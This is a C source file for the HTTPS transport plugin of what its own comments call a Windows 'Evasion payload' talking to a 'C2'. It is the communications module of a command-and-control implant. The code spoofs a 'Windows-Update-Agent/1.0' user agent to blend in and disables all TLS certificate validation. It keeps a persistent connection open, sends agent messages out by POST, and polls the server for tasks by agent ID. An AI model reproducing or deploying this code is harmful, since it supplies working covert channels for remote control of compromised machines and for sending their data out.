#ifdef USE_HTTPS

#include "transport.h"
#include <json-c/json.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <windows.h>
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")
#else
#error                                                                         \
    "The HTTPS WinHTTP transport plugin is for Windows Evasion payloads only."
#endif

/* ─── Persistent Connection State ───
 * Instead of creating/destroying WinHTTP handles on EVERY request,
 * we keep a persistent session + connection handle open for the
 * lifetime of the agent. This eliminates TCP handshake and DNS
 * resolution overhead on each call, making comms near-instant. */
static HINTERNET hPersistSession = NULL;
static HINTERNET hPersistConnect = NULL;

/* Plugin Config */
static wchar_t server_host[256] = {0};
static int server_port = 443;
static int use_ssl = 1;
static wchar_t agent_id_w[64] = {0};
static char agent_id[64] = {0};

/* Pre-built path for task polling (avoids swprintf every call) */
static wchar_t task_path[256] = {0};

/* Helper to convert UTF-8 char* to UTF-16 wchar_t* for WinHTTP */
static void to_wide_string(const char *utf8, wchar_t *out,
                           size_t out_len_words) {
  if (!utf8 || !out)
    return;
  MultiByteToWideChar(CP_UTF8, 0, utf8, -1, out, (int)out_len_words);
}

/* Reconnect helper — called on init and on connection failure */
static int ensure_connection(void) {
  /* If we already have valid handles, done */
  if (hPersistSession && hPersistConnect)
    return 0;

  /* Clean up stale handles if partial */
  if (hPersistConnect) {
    WinHttpCloseHandle(hPersistConnect);
    hPersistConnect = NULL;
  }
  if (hPersistSession) {
    WinHttpCloseHandle(hPersistSession);
    hPersistSession = NULL;
  }

  /* Create session with async DNS + keep-alive */
  hPersistSession = WinHttpOpen(L"Windows-Update-Agent/1.0",
                                WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                WINHTTP_NO_PROXY_NAME,
                                WINHTTP_NO_PROXY_BYPASS, 0);
  if (!hPersistSession)
    return -1;

  /* Enable HTTP/1.1 keep-alive (default) and set aggressive timeouts */
  WinHttpSetTimeouts(hPersistSession,
                     3000,   /* DNS resolve timeout */
                     3000,   /* Connect timeout */
                     3000,   /* Send timeout */
                     5000);  /* Receive timeout */

  /* Persistent connection to the server */
  hPersistConnect =
      WinHttpConnect(hPersistSession, server_host, server_port, 0);
  if (!hPersistConnect) {
    WinHttpCloseHandle(hPersistSession);
    hPersistSession = NULL;
    return -1;
  }

  return 0;
}

static int https_init(const char *config_json) {
  struct json_object *cfg = json_tokener_parse(config_json);
  if (!cfg)
    return -1;

  struct json_object *host_obj, *port_obj, *ssl_obj, *agent_id_obj;
  char host_str[256] = {0};

  if (json_object_object_get_ex(cfg, "server_host", &host_obj))
    strncpy(host_str, json_object_get_string(host_obj), sizeof(host_str) - 1);

  if (json_object_object_get_ex(cfg, "server_port", &port_obj))
    server_port = json_object_get_int(port_obj);

  if (json_object_object_get_ex(cfg, "use_ssl", &ssl_obj))
    use_ssl = json_object_get_boolean(ssl_obj);

  if (json_object_object_get_ex(cfg, "agent_id", &agent_id_obj)) {
    strncpy(agent_id, json_object_get_string(agent_id_obj),
            sizeof(agent_id) - 1);
    to_wide_string(agent_id, agent_id_w, sizeof(agent_id_w) / sizeof(wchar_t));
  }

  to_wide_string(host_str, server_host, sizeof(server_host) / sizeof(wchar_t));
  json_object_put(cfg);

  /* Pre-build the task polling path once */
  swprintf(task_path, sizeof(task_path) / sizeof(wchar_t),
           L"/api/v1/task/%s", agent_id_w);

  /* Establish persistent connection immediately */
  return ensure_connection();
}

static int https_send(const unsigned char *data, size_t len) {
  /* Reconnect if needed */
  if (ensure_connection() != 0)
    return -1;

  HINTERNET hRequest = NULL;
  int ret = -1;

  DWORD flags = use_ssl ? WINHTTP_FLAG_SECURE : 0;

  /* POST to /api/v1/agent_message (uses persistent connection) */
  hRequest = WinHttpOpenRequest(hPersistConnect, L"POST",
                                L"/api/v1/agent_message", NULL,
                                WINHTTP_NO_REFERER,
                                WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
  if (!hRequest)
    goto cleanup;

  /* Ignore SSL certificate errors for testing / self-signed C2s */
  if (use_ssl) {
    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags,
                     sizeof(dwFlags));
  }

  /* Add Content-Type Header */
  LPCWSTR header = L"Content-Type: application/json\r\n";
  if (!WinHttpAddRequestHeaders(hRequest, header, (DWORD)-1,
                                WINHTTP_ADDREQ_FLAG_ADD))
    goto cleanup;

  /* Send Request */
  if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                          (LPVOID)data, (DWORD)len, (DWORD)len, 0))
    goto reconnect;

  /* Wait for Response */
  if (!WinHttpReceiveResponse(hRequest, NULL))
    goto reconnect;

  DWORD statusCode = 0;
  DWORD statusCodeSize = sizeof(statusCode);
  if (WinHttpQueryHeaders(hRequest,
                          WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                          WINHTTP_HEADER_NAME_BY_INDEX, &statusCode,
                          &statusCodeSize, WINHTTP_NO_HEADER_INDEX)) {
    if (statusCode == 200 || statusCode == 201)
      ret = 0;
  }
  goto cleanup;

reconnect:
  /* Connection died — tear down and reconnect next call */
  if (hRequest)
    WinHttpCloseHandle(hRequest);
  if (hPersistConnect)
    WinHttpCloseHandle(hPersistConnect);
  if (hPersistSession)
    WinHttpCloseHandle(hPersistSession);
  hPersistConnect = NULL;
  hPersistSession = NULL;
  hRequest = NULL;
  return -1;

cleanup:
  if (hRequest)
    WinHttpCloseHandle(hRequest);
  return ret;
}

static int https_recv(unsigned char *buffer, size_t *len, int timeout_ms) {
  /* Reconnect if needed */
  if (ensure_connection() != 0)
    return -1;

  HINTERNET hRequest = NULL;
  int received_something = 0;
  size_t capacity = *len;
  *len = 0;

  DWORD flags = use_ssl ? WINHTTP_FLAG_SECURE : 0;

  hRequest = WinHttpOpenRequest(hPersistConnect, L"GET", task_path, NULL,
                                WINHTTP_NO_REFERER,
                                WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
  if (!hRequest)
    goto cleanup;

  if (use_ssl) {
    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags,
                     sizeof(dwFlags));
  }

  if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                          WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
    goto reconnect;
  if (!WinHttpReceiveResponse(hRequest, NULL))
    goto reconnect;

  DWORD statusCode = 0;
  DWORD statusCodeSize = sizeof(statusCode);
  if (WinHttpQueryHeaders(hRequest,
                          WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                          WINHTTP_HEADER_NAME_BY_INDEX, &statusCode,
                          &statusCodeSize, WINHTTP_NO_HEADER_INDEX)) {
    if (statusCode == 200) {
      DWORD dwSize = 0;
      DWORD dwDownloaded = 0;
      size_t total_written = 0;

      do {
        dwSize = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
          break;
        if (dwSize == 0)
          break;

        if (total_written + dwSize > capacity)
          break;

        if (!WinHttpReadData(hRequest, (LPVOID)(buffer + total_written), dwSize,
                             &dwDownloaded))
          break;

        total_written += dwDownloaded;
        if (dwDownloaded == 0)
          break;

      } while (dwSize > 0);

      *len = total_written;
      if (total_written > 0) {
        received_something = 1;
        if (total_written < capacity) {
          buffer[total_written] = '\0';
        } else {
          buffer[capacity - 1] = '\0';
        }
      }
    }
    /* 204 No Content = no tasks, just return 0 */
  }
  goto cleanup;

reconnect:
  if (hRequest)
    WinHttpCloseHandle(hRequest);
  if (hPersistConnect)
    WinHttpCloseHandle(hPersistConnect);
  if (hPersistSession)
    WinHttpCloseHandle(hPersistSession);
  hPersistConnect = NULL;
  hPersistSession = NULL;
  hRequest = NULL;
  return -1;

cleanup:
  if (hRequest)
    WinHttpCloseHandle(hRequest);

  return received_something;
}

static void https_shutdown(void) {
  if (hPersistConnect) {
    WinHttpCloseHandle(hPersistConnect);
    hPersistConnect = NULL;
  }
  if (hPersistSession) {
    WinHttpCloseHandle(hPersistSession);
    hPersistSession = NULL;
  }
}

transport_t transport_https = {.init = https_init,
                               .send = https_send,
                               .recv = https_recv,
                               .shutdown = https_shutdown};

#endif // USE_HTTPS
